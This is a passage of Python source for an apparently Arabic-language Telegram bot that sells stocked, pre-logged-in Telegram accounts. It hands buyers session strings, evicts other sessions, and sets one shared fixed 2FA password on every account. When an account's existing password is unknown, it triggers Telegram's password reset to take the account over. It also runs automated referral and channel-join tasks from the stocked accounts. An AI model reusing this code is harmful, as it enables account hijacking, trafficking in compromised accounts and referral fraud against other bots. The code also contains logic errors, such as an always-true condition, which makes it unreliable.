    """يضيف رقماً جاهزاً (مسجّل دخول مسبقاً) مع جلسته إلى المخزون. يُرجع False إن كان الرقم موجوداً مسبقاً."""
    with db_conn() as c:
        c.execute(
            "INSERT INTO number_stock (phone_number, session_string, deleted_at) VALUES (%s,%s,NULL) "
            "ON CONFLICT (phone_number) DO UPDATE SET session_string=EXCLUDED.session_string, deleted_at=NULL",
            (phone, session_str)
        )
        return True


def assign_next_number(user_id: int):
    """يسحب رقماً متاحاً من المخزون ويحجزه لهذا المستخدم بشكل ذرّي (يمنع تكرار تسليم نفس الرقم
    لشخصين عند الطلب المتزامن). يُرجع dict {phone_number, session_string} إن وُجد، أو None إن كان المخزون فارغاً."""
    with db_conn() as c:
        # جلب الأرقام التي سبق بيعها لهذا المستخدم بشكل مكتمل — لمنع إعطائه نفس الرقم مرتين
        already_sold = c.execute(
            "SELECT prize_value FROM prize_exchanges "
            "WHERE user_id=%s AND status IN ('completed','duplicate_compensated') "
            "AND prize_type IN ('telegram_number','telegram_number_code') "
            "AND prize_value NOT IN ('number','manual')",
            (user_id,)
        ).fetchall()
        exclude_phones = [r["prize_value"] for r in already_sold] if already_sold else []
        excl_sql = ""
        excl_params = []
        if exclude_phones:
            placeholders = ",".join(["%s"] * len(exclude_phones))
            excl_sql = f" AND phone_number NOT IN ({placeholders})"
            excl_params = exclude_phones

        row = c.execute(
            "UPDATE number_stock SET assigned_to=%s, assigned_at=NOW(), ever_sold=TRUE "
            "WHERE id = (SELECT id FROM number_stock WHERE assigned_to IS NULL AND deleted_at IS NULL AND "
            f"{_sellable_filter_sql()}{excl_sql} ORDER BY id ASC LIMIT 1 FOR UPDATE SKIP LOCKED) "
            "RETURNING phone_number, session_string",
            [user_id] + excl_params
        ).fetchone()
        if not row:
            return None
        return {"phone_number": row["phone_number"], "session_string": row["session_string"]}


def _auto_delete_number(stock_id: int, phone: str, reason: str):
    """يحذف رقماً من المخزون نهائياً مع تسجيل السبب في اللوج."""
    try:
        with db_conn() as c:
            c.execute(
                "UPDATE number_stock SET deleted_at=NOW(), assigned_to=NULL, assigned_at=NULL "
                "WHERE id=%s",
                (stock_id,)
            )
        logger.warning(f"🗑 حُذف الرقم {phone} تلقائياً — السبب: {reason}")
    except Exception as _del_err:
        logger.error(f"❌ فشل حذف الرقم {phone}: {_del_err}")


async def assign_verified_number(user_id: int, bot=None) -> dict | None:
    """
    يختار رقماً من المخزون ويُجري ثلاثة فحوصات إلزامية قبل التسليم:
      ① ever_sold IS NOT TRUE       — لم يُباع سابقاً (في SQL)
      ② is_user_authorized() = True — البوت لا يزال يستطيع استقبال الأكواد
      ③ twofa_password مضبوط       — البوت يعرف رمز التحقق الثنائي

    أي فشل → يحذف الرقم نهائياً من المخزون ويجرب التالي.
    أرقام بلا session (يدوية) → تُحذف فوراً ولا تُعرض للبيع.
    يُرجع dict {phone_number, session_string, twofa_password} أو None إن فرغ المخزون.
    """
    if not (TELEGRAM_API_ID and TELEGRAM_API_HASH):
        # بدون API_ID/HASH لا يمكن التحقق — نرفض التسليم مباشرة
        logger.error("❌ TELEGRAM_API_ID/HASH غير مضبوط — تعذّر التحقق من الأرقام قبل البيع.")
        return None

    MAX_TRIES = 10
    skipped_ids: list[int] = []

    # الأرقام المبيوعة سابقاً لهذا المستخدم — لمنع إعطائه نفس الرقم مرتين
    with db_conn() as _dup_c:
        _already = _dup_c.execute(
            "SELECT prize_value FROM prize_exchanges "
            "WHERE user_id=%s AND status IN ('completed','duplicate_compensated') "
            "AND prize_type IN ('telegram_number','telegram_number_code') "
            "AND prize_value NOT IN ('number','manual')",
            (user_id,)
        ).fetchall()
    _exclude_phones = [r["prize_value"] for r in (_already or [])]

    for _attempt in range(MAX_TRIES):
        # ── سحب رقم مرشح بشكل ذري ──
        with db_conn() as c:
            excl_parts: list[str] = []
            excl_vals:  list      = []
            if skipped_ids:
                excl_parts.append(f"AND id NOT IN ({','.join(str(i) for i in skipped_ids)})")
            if _exclude_phones:
                ph_phs = ",".join(["%s"] * len(_exclude_phones))
                excl_parts.append(f"AND phone_number NOT IN ({ph_phs})")
                excl_vals.extend(_exclude_phones)
            excl = " ".join(excl_parts)
            row = c.execute(
                f"UPDATE number_stock SET assigned_to=%s, assigned_at=NOW(), ever_sold=TRUE "
                f"WHERE id = (SELECT id FROM number_stock "
                f"WHERE assigned_to IS NULL AND deleted_at IS NULL AND {_sellable_filter_sql()} "
                f"{excl} ORDER BY RANDOM() LIMIT 1 FOR UPDATE SKIP LOCKED) "
                f"RETURNING id, phone_number, session_string, twofa_password",
                [user_id] + excl_vals
            ).fetchone()

        if not row:
            break  # المخزون فارغ تماماً

        stock_id = row["id"]
        phone    = row["phone_number"]
        sess     = row["session_string"]
        saved_pw = row["twofa_password"] or ""

        # ─── فحص ①: هل للرقم جلسة أصلاً؟ (رقم يدوي = يُحذف) ───
        if not sess:
            _auto_delete_number(stock_id, phone, "رقم يدوي بلا جلسة — لا يُباع")
            continue

        # ─── فحص ③: هل كلمة مرور 2FA مخزّنة؟ ───
        if not saved_pw.strip():
            _auto_delete_number(stock_id, phone, "لا يوجد رمز 2FA — لا يمكن تسليمه للمشتري")
            continue

        # ─── فحص ②: هل البوت لا يزال مصرّحاً (يستطيع استقبال الأكواد)؟ ───
        cli_check = None
        try:
            cli_check = TelegramClient(StringSession(sess), int(TELEGRAM_API_ID), TELEGRAM_API_HASH)
            await asyncio.wait_for(cli_check.connect(), timeout=15)
            authorized = await asyncio.wait_for(cli_check.is_user_authorized(), timeout=10)

            if not authorized:
                _auto_delete_number(stock_id, phone, "جلسة منتهية — البوت لا يستطيع استقبال الأكواد")
                await cli_check.disconnect()
                continue

            # ─── فحص إضافي: هل الحساب مجمّد؟ ───
            is_frz, _, _ = await check_account_frozen(cli_check, stock_id)
            if is_frz:
                _auto_delete_number(stock_id, phone, "حساب مجمّد من تيليغرام")
                await cli_check.disconnect()
                continue

            # ─── تنظيف: طرد أي أجهزة إضافية قبل التسليم ───
            devices = await get_device_count(cli_check)
            if devices > 1:
                try:
                    await cli_check(ResetAuthorizationsRequest())
                    with db_conn() as c:
                        c.execute("UPDATE number_stock SET sessions_reset=TRUE WHERE id=%s", (stock_id,))
                    logger.info(f"✅ طُردت {devices - 1} جلسة إضافية للرقم {phone} قبل التسليم.")
                except Exception as kick_err:
                    logger.warning(f"⚠️ تعذّر طرد جلسات {phone}: {kick_err}")

            await cli_check.disconnect()

        except Exception as chk_err:
            logger.warning(f"⚠️ فشل الاتصال بجلسة {phone}: {chk_err} — يُحذف")
            _auto_delete_number(stock_id, phone, f"خطأ في الاتصال: {type(chk_err).__name__}")
            try:
                if cli_check:
                    await cli_check.disconnect()
            except Exception:
                pass
            continue

        # ─── الرقم اجتاز الفحوصات الثلاثة ✅ ───
        logger.info(f"✅ الرقم {phone} اجتاز جميع الفحوصات — جاهز للتسليم.")
        return {"phone_number": phone, "session_string": sess, "twofa_password": saved_pw}

    logger.info(f"📭 assign_verified_number: لا يوجد رقم صالح بعد {MAX_TRIES} محاولة.")
    return None


# ═══════════════════════════════════════════════════════════
#  مساعدات قاعدة بيانات مهام الإحالة التلقائية
# ═══════════════════════════════════════════════════════════

def get_referral_tasks(only_active: bool = False) -> list:
    with db_conn() as c:
        sql = "SELECT * FROM referral_tasks"
        if only_active:
            sql += " WHERE active=1"
        sql += " ORDER BY id ASC"
        return [dict(r) for r in c.execute(sql).fetchall()]


def get_referral_task(task_id: int) -> dict | None:
    with db_conn() as c:
        row = c.execute("SELECT * FROM referral_tasks WHERE id=%s", (task_id,)).fetchone()
        return dict(row) if row else None


def add_referral_task(label: str, bot_username: str, start_param: str) -> int:
    with db_conn() as c:
        row = c.execute(
            "INSERT INTO referral_tasks (label, bot_username, start_param) VALUES (%s,%s,%s) RETURNING id",
            (label, bot_username, start_param)
        ).fetchone()
        return row["id"]


def delete_referral_task(task_id: int):
    with db_conn() as c:
        c.execute("DELETE FROM referral_completions WHERE task_id=%s", (task_id,))
        c.execute("DELETE FROM referral_tasks WHERE id=%s", (task_id,))


def toggle_referral_task(task_id: int) -> bool:
    """يعكس حالة التفعيل ويُرجع الحالة الجديدة (True=نشط)."""
    with db_conn() as c:
        row = c.execute("SELECT active FROM referral_tasks WHERE id=%s", (task_id,)).fetchone()
        if not row:
            return False
        new_val = 0 if row["active"] else 1
        c.execute("UPDATE referral_tasks SET active=%s WHERE id=%s", (new_val, task_id))
        return bool(new_val)


def get_referral_task_stats(task_id: int) -> dict:
    """يُرجع إحصاء: done / failed / pending / total لمهمة إحالة معيّنة."""
    with db_conn() as c:
        rows = c.execute(
            "SELECT status, COUNT(*) as cnt FROM referral_completions WHERE task_id=%s GROUP BY status",
            (task_id,)
        ).fetchall()
        stats = {"done": 0, "failed": 0, "pending": 0}
        for r in rows:
            stats[r["status"]] = r["cnt"]
        stats["total"] = sum(stats.values())
        return stats


def get_pending_numbers_for_task(task_id: int) -> list:
    """أرقام المخزون التي لم تُكمل هذه المهمة بعد (لم تُسجَّل في referral_completions بحالة done)."""
    with db_conn() as c:
        rows = c.execute(
            """
            SELECT ns.id, ns.phone_number, ns.session_string
            FROM number_stock ns
            WHERE ns.session_string IS NOT NULL
              AND ns.id NOT IN (
                  SELECT stock_id FROM referral_completions
                  WHERE task_id=%s AND status='done'
              )
            ORDER BY ns.id ASC
            """,
            (task_id,)
        ).fetchall()
        return [dict(r) for r in rows]


def mark_referral_completion(task_id: int, stock_id: int, status: str, error_msg: str = None):
    with db_conn() as c:
        c.execute(
            """
            INSERT INTO referral_completions (task_id, stock_id, status, done_at, error_msg)
            VALUES (%s, %s, %s, NOW(), %s)
            ON CONFLICT (task_id, stock_id) DO UPDATE
              SET status=EXCLUDED.status, done_at=EXCLUDED.done_at, error_msg=EXCLUDED.error_msg
            """,
            (task_id, stock_id, status, error_msg)
        )


# ═══════════════════════════════════════════════════════════
#  تنفيذ الإحالة الفعلية لرقم واحد
# ═══════════════════════════════════════════════════════════

async def do_referral_for_number(phone: str, session_str: str, bot_username: str, start_param: str) -> tuple:
    """
    يُرسل /start مع بارامتر الإحالة إلى البوت المطلوب باستخدام جلسة الرقم المخزونة.
    يُرجع (success: bool, detail: str).

    الفرق عن /start العادي:
    - يُستخدم StartBotRequest وهو ما يُسجّل الإحالة رسمياً في Telegram API
      (مكافئ للنقر على رابط t.me/BotName?start=refCODE من داخل تطبيق تيليجرام).
    """
    client = TelegramClient(
        StringSession(session_str),
        int(TELEGRAM_API_ID),
        TELEGRAM_API_HASH,
    )
    try:
        await client.connect()
        if not await client.is_user_authorized():
            return False, "جلسة منتهية أو مُلغاة"

        # جلب كيان البوت
        bot_entity = await client.get_entity(bot_username)

        # StartBotRequest يُرسل deep-link start — يُسجّل كإحالة حقيقية
        await client(StartBotRequest(
            bot=bot_entity,
            peer=bot_entity,
            start_param=start_param,
        ))

        # ننتظر ليصل رد البوت ثم نقرأ رسالته الأولى (قد تطلب الانضمام لقنوات)
        await asyncio.sleep(3)
        msgs = await client.get_messages(bot_entity, limit=3)
        joined_channels = 0

        for msg in msgs:
            if not msg.buttons:
                continue
            for row in msg.buttons:
                for btn in row:
                    # زر url يحتوي على رابط قناة → نحاول الانضمام
                    url = getattr(btn, "url", None) or ""
                    if "t.me/" not in url and "telegram.me/" not in url:
                        continue
                    try:
                        # استخراج username أو invite hash من الرابط
                        if "joinchat/" in url or "+": 
                            # رابط دعوة خاص مثل t.me/+XXXXX
                            invite_part = url.split("/+")[-1] if "/+" in url else url.split("joinchat/")[-1]
                            invite_part = invite_part.split("?")[0].strip()
                            if invite_part:
                                await client(
                                    __import__("telethon.tl.functions.messages", fromlist=["ImportChatInviteRequest"])
                                    .ImportChatInviteRequest(invite_part)
                                )
                                joined_channels += 1
                        else:
                            # رابط عام @username
                            ch_name = url.rstrip("/").split("/")[-1].split("?")[0]
                            if ch_name:
                                ch_entity = await client.get_entity(ch_name)
                                from telethon.tl.functions.channels import JoinChannelRequest
                                await client(JoinChannelRequest(ch_entity))
                                joined_channels += 1
                        await asyncio.sleep(1)
                    except Exception:
                        pass

        detail = f"تمت الإحالة بنجاح" + (f" + انضم لـ {joined_channels} قناة" if joined_channels else "")
        return True, detail

    except Exception as e:
        err = str(e)
        logger.error(f"❌ فشلت إحالة {phone} → {bot_username}: {err}")
        return False, err[:120]
    finally:
        try:
            await client.disconnect()
        except Exception:
            pass


# ═══════════════════════════════════════════════════════════
#  المهمة الدورية — تشغيل الإحالات التلقائية
# ═══════════════════════════════════════════════════════════

async def run_referral_tasks_job(context: ContextTypes.DEFAULT_TYPE):
    """تُشغَّل كل ساعة: تُكمل الإحالات لكل الأرقام التي لم تُنفّذها بعد."""
    if not (TELEGRAM_API_ID and TELEGRAM_API_HASH):
        return
    tasks = get_referral_tasks(only_active=True)
    if not tasks:
        return
    for task in tasks:
        pending = get_pending_numbers_for_task(task["id"])
        if not pending:
            continue
        logger.info(f"🤝 مهمة إحالة [{task['label']}]: {len(pending)} رقم معلّق")
        done = failed = 0
        for num in pending:
            success, detail = await do_referral_for_number(
                num["phone_number"], num["session_string"],
                task["bot_username"], task["start_param"]
            )
            status = "done" if success else "failed"
            mark_referral_completion(task["id"], num["id"], status,
                                     None if success else detail)
            if success:
                done += 1
            else:
                failed += 1
            await asyncio.sleep(2)   # فاصل بين أرقام لتفادي flood
        logger.info(f"✅ مهمة [{task['label']}]: {done} نجحت، {failed} فشلت")
        if OWNER_ID:
            try:
                await context.bot.send_message(
                    OWNER_ID,
                    f"🤝 *مهمة إحالة: {task['label']}*\n\n"
                    f"✅ نجحت: {done}\n❌ فشلت: {failed}",
                    parse_mode=ParseMode.MARKDOWN
                )
            except Exception:
                pass


# ═══════════════════════════════════════════════════════════
#  التحقق بخطوتين (2FA) — توليد كلمة مرور وتفعيل تلقائي
# ═══════════════════════════════════════════════════════════

# كلمة مرور التحقق بخطوتين (2FA) ثابتة وموحّدة لكل الحسابات، بناءً على طلب المالك
# تُقرأ من متغير البيئة TWOFA_PASSWORD في Railway (لا تُكتب مباشرة في الكود لأسباب أمنية).
OWNER_FIXED_2FA_PASSWORD = os.getenv("TWOFA_PASSWORD", "محمد")


def generate_2fa_password() -> str:
    """يُرجع كلمة مرور 2FA الثابتة الموحّدة لجميع الحسابات (بدل توليد كلمة عشوائية)."""
    return OWNER_FIXED_2FA_PASSWORD


async def verify_current_2fa_password(client: TelegramClient, password: str, phone: str | None = None) -> bool | None:
    """يتحقّق فعلياً إن كانت كلمة المرور المُعطاة هي كلمة تحقق بخطوتين الحالية للحساب،
    عبر CheckPasswordRequest (SRP) — يتحقق فقط ولا يُعدّل الكلمة أبداً.
    يُرجع True لو صحيحة، False لو خاطئة بالتأكيد، أو None لو تعذّر التأكد (خطأ شبكي مثلاً)."""
    try:
        pwd_state = await client(GetPasswordRequest())
        if not pwd_state.has_password:
            # لا يوجد 2FA على الحساب — لا مانع
            return True
        pwd_check = compute_check(pwd_state, password)
        await client(CheckPasswordRequest(password=pwd_check))
        return True
    except Exception as e:
        err = str(e).upper()
        if "PASSWORD_HASH_INVALID" in err or "SRP_ID_INVALID" in err:
            return False
        logger.warning(f"⚠️ تعذّر التحقق من كلمة مرور 2FA الحالية: {e}")
        return None


async def enable_2fa_for_number(phone: str, session_str: str, stock_id: int, bot=None) -> tuple:
    """
    يُفعّل التحقق بخطوتين (كلمة مرور السحابة Cloud Password) لحساب تيليجرام.
    — إذا لم تكن هناك كلمة مرور مسبقاً: يُفعّل الكلمة الثابتة المعتمدة (محمد).
    — إذا كانت مفعّلة مسبقاً وعندنا كلمتها: لا يفعل شيئاً (بالفعل آمن).
    — إذا كانت مفعّلة مسبقاً وليس عندنا كلمتها: يتحقق فعلياً من الكلمة الثابتة (محمد)؛
      لو صحيحة يحفظها، لو خاطئة يُبلّغ المالك (إن أُعطي `bot`) ويطلب الكلمة الصحيحة، ولا يخزّن شيئاً خاطئاً.
    يُرجع (success: bool, message: str, password: str|None).
    """
    if not (TELEGRAM_API_ID and TELEGRAM_API_HASH):
        return False, "TELEGRAM_API_ID/HASH غير مضبوط", None

    client = TelegramClient(
        StringSession(session_str),
        int(TELEGRAM_API_ID),
        TELEGRAM_API_HASH,
    )
    try:
        await client.connect()
        if not await client.is_user_authorized():
            return False, "الجلسة منتهية أو مُلغاة", None

        # ─── فحص هل 2FA مفعّل مسبقاً ───────────────────────────────
        pwd_state = await client(GetPasswordRequest())
        if pwd_state.has_password:
            # هل عندنا كلمة المرور محفوظة؟
            with db_conn() as c:
                row = c.execute(
                    "SELECT twofa_password FROM number_stock WHERE id=%s", (stock_id,)
                ).fetchone()
            saved_pwd = row["twofa_password"] if row else None

            if saved_pwd:
                if saved_pwd == OWNER_FIXED_2FA_PASSWORD:
                    # 2FA مطابق للكلمة الثابتة — لا حاجة لأي تغيير
                    return True, "2FA مفعّل مسبقاً وكلمة المرور محفوظة", saved_pwd
                else:
                    # ─── كلمة المرور المخزّنة ≠ "محمد" → نغيّرها الآن ───
                    try:
                        _expected_2fa_change[phone] = time.time()
                        await client.edit_2fa(
                            current_password=saved_pwd,
                            new_password=OWNER_FIXED_2FA_PASSWORD,
                        )
                        with db_conn() as _uc:
                            _uc.execute(
                                "UPDATE number_stock SET twofa_password=%s, auto_2fa_enabled=TRUE WHERE id=%s",
                                (OWNER_FIXED_2FA_PASSWORD, stock_id)
                            )
                        logger.info(f"🔐 تم تغيير 2FA للرقم {phone} إلى الكلمة الثابتة")
                        return True, "تم تغيير 2FA إلى الكلمة الثابتة بنجاح", OWNER_FIXED_2FA_PASSWORD
                    except Exception as _ch_e:
                        logger.warning(f"⚠️ فشل تغيير 2FA للرقم {phone}: {_ch_e}")
                        return False, f"فشل تغيير 2FA: {str(_ch_e)[:80]}", None

            # ─── لا نعرف كلمة المرور بعد: نتحقق فعلياً من الكلمة الثابتة "محمد" ───
            verified = await verify_current_2fa_password(client, OWNER_FIXED_2FA_PASSWORD, phone=phone)
            if verified is True:
                with db_conn() as c:
                    c.execute(
                        "UPDATE number_stock SET twofa_password=%s WHERE id=%s",
                        (OWNER_FIXED_2FA_PASSWORD, stock_id)
                    )
                return True, "2FA مفعّل مسبقاً — تم التحقق من الكلمة الثابتة وحفظها", OWNER_FIXED_2FA_PASSWORD
            elif verified is False:
                # ─── كلمة المرور غير معروفة وليست "محمد" → نطلب إعادة تعيين 7 أيام ───
                import datetime as _dt_r
                try:
                    await client(ResetPasswordRequest())
                    _reset_date = _dt_r.datetime.now(_dt_r.timezone.utc) + _dt_r.timedelta(days=7)
                    with db_conn() as _rc:
                        _rc.execute(
                            "UPDATE number_stock SET twofa_reset_date=%s WHERE id=%s",
                            (_reset_date, stock_id)
                        )
                    logger.info(f"🔐 بدأ إجراء إعادة تعيين 2FA (7 أيام) للرقم {phone}")
                    if bot is not None:
                        try:
                            await bot.send_message(
                                NUMBERS_GROUP_ID or OWNER_ID,
                                f"⏳ *إعادة تعيين 2FA — انتظار 7 أيام*\n\n"
                                f"📱 الرقم: `{phone}`\n"
                                f"🔐 كلمة المرور الثابتة \"{OWNER_FIXED_2FA_PASSWORD}\" غير صحيحة.\n"
                                f"✅ تم تشغيل إجراء نسيان التحقق تلقائياً.\n"
                                f"📅 سيتم تعيين كلمة المرور الجديدة تلقائياً بعد 7 أيام.",
                                parse_mode="Markdown"
                            )
                        except Exception:
                            pass
                    return False, "تم تشغيل إعادة التعيين — ستُضبط كلمة المرور تلقائياً بعد 7 أيام", None
                except Exception as _rp_e:
                    logger.warning(f"⚠️ فشل تشغيل ResetPasswordRequest للرقم {phone}: {_rp_e}")
                    if bot is not None:
                        try:
                            await request_manual_2fa_password(bot, phone, stock_id)
                        except Exception:
                            pass
                    return False, f"كلمة المرور الثابتة \"{OWNER_FIXED_2FA_PASSWORD}\" غير صحيحة ولم ينجح إجراء الإعادة: {str(_rp_e)[:60]}", None
            else:
                return False, "2FA مفعّل مسبقاً، تعذّر التحقق من الكلمة الثابتة الآن (سيُعاد المحاولة لاحقاً)", None

        # ─── توليد كلمة مرور جديدة وتفعيل 2FA ──────────────────────
        new_pwd = generate_2fa_password()
        _expected_2fa_change[phone] = time.time()
        await client.edit_2fa(
            new_password=new_pwd,
            hint="Auto",     # تلميح محايد لا يكشف شيئاً
        )

        # ─── حفظ كلمة المرور وتعليم الحساب بأن البوت فعّل 2FA تلقائياً ───
        with db_conn() as c:
            c.execute(
                "UPDATE number_stock SET twofa_password=%s, auto_2fa_enabled=TRUE WHERE id=%s",
                (new_pwd, stock_id)
            )

        logger.info(f"🔐 تم تفعيل 2FA للرقم {phone} بنجاح (تلقائياً)")
        return True, "تم تفعيل التحقق بخطوتين بنجاح", new_pwd

    except Exception as e:
        err = str(e)
        logger.error(f"❌ فشل تفعيل 2FA للرقم {phone}: {err}")
        return False, err[:120], None
    finally:
        try:
            await client.disconnect()
        except Exception:
            pass


async def check_twofa_reset_job(context: ContextTypes.DEFAULT_TYPE):
    """مهمة دورية: تُكمل إعادة تعيين 2FA للحسابات التي انتهت مهلة 7 أيام."""
    import datetime as _dt
    _now = _dt.datetime.now(_dt.timezone.utc)
    with db_conn() as c:
        rows = c.execute(
            "SELECT id, phone_number, session_string FROM number_stock "
            "WHERE twofa_reset_date IS NOT NULL AND twofa_reset_date <= %s "
            "AND session_string IS NOT NULL",
            (_now,)
        ).fetchall()
    if not rows:
        return
    logger.info(f"🔐 check_twofa_reset_job: {len(rows)} حساب جاهز لإكمال إعادة تعيين 2FA")
    for rec in rows:
        phone = rec["phone_number"]
        try:
            _cl = TelegramClient(StringSession(rec["session_string"]), int(TELEGRAM_API_ID), TELEGRAM_API_HASH)
            await _cl.connect()
            if not await _cl.is_user_authorized():
                await _cl.disconnect()
                continue
            # إكمال إعادة التعيين
            _res = await _cl(ResetPasswordRequest())
            # نعيّن الباسورد الجديد
            await _cl.edit_2fa(new_password=OWNER_FIXED_2FA_PASSWORD)
            with db_conn() as _uc:
                _uc.execute(
                    "UPDATE number_stock SET twofa_password=%s, twofa_reset_date=NULL, auto_2fa_enabled=TRUE WHERE id=%s",
                    (OWNER_FIXED_2FA_PASSWORD, rec["id"])
                )
            logger.info(f"✅ check_twofa_reset_job: تم تعيين 2FA={OWNER_FIXED_2FA_PASSWORD} للرقم {phone}")
            _n_target = NUMBERS_GROUP_ID or OWNER_ID
            if _n_target and context.bot:
                try:
                    await context.bot.send_message(
                        _n_target,
                        f"✅ *اكتمل إعادة تعيين 2FA*\n\n"
                        f"📱 الرقم: `{phone}`\n"
                        f"🔐 كلمة المرور الجديدة: `{OWNER_FIXED_2FA_PASSWORD}`",
                        parse_mode=ParseMode.MARKDOWN
                    )
                except Exception:
                    pass
            await _cl.disconnect()
        except Exception as _e:
            logger.warning(f"⚠️ check_twofa_reset_job: فشل إكمال reset للرقم {phone}: {_e}")
            # إذا الخطأ يعني المهلة لم تنتهِ بعد → نبقّي الصف كما هو
            try:
                await _cl.disconnect()
            except Exception:
                pass
        await asyncio.sleep(3)


async def enable_pending_2fa_job(context: ContextTypes.DEFAULT_TYPE):
    """مهمة دورية: تُفعّل 2FA على كل الأرقام التي ليس عندها كلمة مرور محفوظة بعد."""
    if not (TELEGRAM_API_ID and TELEGRAM_API_HASH):
        return
    with db_conn() as c:
        rows = c.execute(
            "SELECT id, phone_number, session_string FROM number_stock "
            "WHERE session_string IS NOT NULL AND (twofa_password IS NULL OR twofa_password = '')"
        ).fetchall()
    if not rows:
        return
    logger.info(f"🔐 مهمة 2FA: {len(rows)} رقم بحاجة لتفعيل التحقق بخطوتين")
    done = failed = skipped = 0
    for rec in rows:
        success, msg, pwd = await enable_2fa_for_number(
            rec["phone_number"], rec["session_string"], rec["id"], bot=context.bot
        )
        if success:
            done += 1
        elif "مسبقاً بكلمة مرور غير معروفة" in msg:
            skipped += 1
        else:
            failed += 1
        await asyncio.sleep(3)
    # ─── هذه المهمة الدورية صامتة: لا تُرسل تقريراً للمالك في كل دورة (بناءً على طلبه)،
    # يكفي تسجيلها في السجلات الداخلية (logs). يُبلَّغ المالك فعلياً فقط عند فشل فعلي
    # يحتاج تدخله (مثل طلب كلمة 2FA اليدوية عبر request_manual_2fa_password) ───
    logger.info(f"✅ مهمة 2FA: {done} نجحت | {skipped} مُتجاوزة | {failed} فشلت")


async def _cleanup_pending_login(owner_id: int):
    pending = _pending_number_logins.pop(owner_id, None)
    if pending:
        try:
            await pending["client"].disconnect()
        except Exception:
            pass


async def _finish_number_login(update: Update, context: ContextTypes.DEFAULT_TYPE, owner_id: int):
    """يُستدعى بعد نجاح تسجيل الدخول (بكود فقط أو بكود + كلمة مرور): يحفظ الجلسة بالمخزون وينظّف الحالة المؤقتة."""
    pending = _pending_number_logins.get(owner_id)
    if not pending:
        return
    client = pending["client"]
    phone = pending["phone"]
    try:
        session_str = client.session.save()
        add_number_with_session(phone, session_str)
        kicked_note = ""
        try:
            await client(ResetAuthorizationsRequest())
            # ─── فحص is_solo: البوت الوحيد بعد الطرد ──────────────────────
            try:
                _dev_cnt = await get_device_count(client)
                _is_solo_now = (_dev_cnt == 1)
                with db_conn() as _sc:
                    _sc.execute(
                        "UPDATE number_stock SET sessions_reset=TRUE, is_solo=%s WHERE phone_number=%s",
                        (_is_solo_now, phone)
                    )
                if _is_solo_now:
                    # البوت الجلسة الوحيدة — نتحقق من can_send_code
                    with db_conn() as _sid:
                        _sid_row = _sid.execute(
                            "SELECT id FROM number_stock WHERE phone_number=%s", (phone,)
                        ).fetchone()
                    if _sid_row:
                        asyncio.create_task(
                            _test_and_set_can_send_code(phone, session_str, _sid_row["id"])
                        )
            except Exception as _dev_e:
                with db_conn() as c:
                    c.execute("UPDATE number_stock SET sessions_reset=TRUE WHERE phone_number=%s", (phone,))
                logger.debug(f"⚠️ فحص is_solo بعد الطرد فشل للرقم {phone}: {_dev_e}")
            kicked_note = "\n🔒 تم تسجيل خروج كل الأجهزة/الجلسات الأخرى من هذا الحساب تلقائياً."
        except Exception as e:
            logger.warning(f"⚠️ تعذر تسجيل خروج الجلسات الأخرى للرقم {phone} فوراً، سيُعاد المحاولة تلقائياً بالخلفية: {e}")
            kicked_note = "\n⏳ لم يُسمح بطرد الجلسات الأخرى فوراً (قيد مؤقت من تيليجرام)، سيحاول البوت تلقائياً كل فترة حتى ينجح ويرسل لك تنبيهاً."
        try:
            await _start_number_monitor(phone, session_str, context.application)
        except Exception as e:
            logger.warning(f"⚠️ تعذر بدء مراقبة الرقم {phone}: {e}")
        # ─── تفعيل التحقق بخطوتين تلقائياً ───────────────────────────
        twofa_note = ""
        try:
            with db_conn() as c:
                row = c.execute(
                    "SELECT id FROM number_stock WHERE phone_number=%s", (phone,)
                ).fetchone()
            if row:
                ok, msg_2fa, pwd_2fa = await enable_2fa_for_number(phone, session_str, row["id"], bot=context.bot)
                if ok and pwd_2fa:
                    twofa_note = f"\n🔐 *التحقق بخطوتين:* تم تفعيله تلقائياً.\n🗝 كلمة المرور: `{pwd_2fa}`"
                elif not ok:
                    twofa_note = f"\n⚠️ تعذّر تفعيل التحقق بخطوتين: {msg_2fa}"
        except Exception as e2:
            logger.warning(f"⚠️ خطأ في تفعيل 2FA للرقم {phone}: {e2}")
        avail = get_available_number_count()
        await update.message.reply_text(
            f"✅ *تم تسجيل الدخول وحفظ الرقم بالمخزون بنجاح!*\n\n"
            f"📱 {phone}\n📦 إجمالي المتاح الآن: {avail} رقم.{kicked_note}"
            f"{twofa_note}\n\n"
            "🔔 سيُبلّغك البوت تلقائياً بأي تغيير أمني على هذا الحساب (كلمة مرور، بريد استرجاع، جلسة دخول جديدة).\n\n"
            "عند بيع هذا الرقم، سيُرسَل رمز الجلسة تلقائياً للمشتري ليدخل مباشرة بدون أي كود.",
            parse_mode=ParseMode.MARKDOWN,
        )
        # ─── للسرعة: ننتقل مباشرة لطلب الرقم التالي بدون الرجوع لأي قائمة ───
        await update.message.reply_text(
            "📲 أرسل رقم الهاتف التالي (بصيغة دولية، مثل +9647xxxxxxxx) لإضافته، "
            "أو أرسل /cancel للتوقف والرجوع للقائمة."
        )
        context.user_data["state"] = "os_await_login_phone"
    except Exception as e:
        logger.error(f"❌ خطأ في حفظ جلسة الرقم {phone}: {e}")
        await update.message.reply_text(
            "❌ حدث خطأ أثناء حفظ الجلسة. أرسل الرقم التالي للمحاولة من جديد، أو /cancel للتوقف.",
        )
        context.user_data["state"] = "os_await_login_phone"
    finally:
        try:
            await client.disconnect()
        except Exception:
            pass
        _pending_number_logins.pop(owner_id, None)


def is_user_verified(user_id: int) -> bool:
    with db_conn() as c:
        row = c.execute("SELECT verified FROM users WHERE user_id=?", (user_id,)).fetchone()
        return bool(row and row["verified"])

# ── حظر الأعضاء ──

def is_user_banned(user_id: int) -> bool:
    with db_conn() as c:
        row = c.execute("SELECT banned FROM users WHERE user_id=%s", (user_id,)).fetchone()
        return bool(row and row["banned"])

def ban_user_db(user_id: int, reason: str = "") -> bool:
    """يحظر عضواً ويسجّل توقيت الحظر وسببه. يُرجع True إن وُجد المستخدم بالقاعدة."""
    with db_conn() as c:
        c.execute(
            "UPDATE users SET banned=1, banned_at=NOW(), ban_reason=%s WHERE user_id=%s",
            (reason or None, user_id)
        )
        return c.rowcount > 0

def unban_user_db(user_id: int) -> bool:
    with db_conn() as c:
        c.execute(
            "UPDATE users SET banned=0, banned_at=NULL, ban_reason=NULL WHERE user_id=%s",
            (user_id,)
        )
        return c.rowcount > 0

def lookup_user_by_id_or_username(text: str) -> dict | None:
    """يبحث عن مستخدم بالـ ID أو بالـ username (بدون أو مع @).
    يُرجع صف المستخدم كـ dict أو None إن لم يُوجد."""
    text = text.strip().lstrip("@")
    with db_conn() as c:
        # جرّب ID رقمياً أولاً
        if text.isdigit():
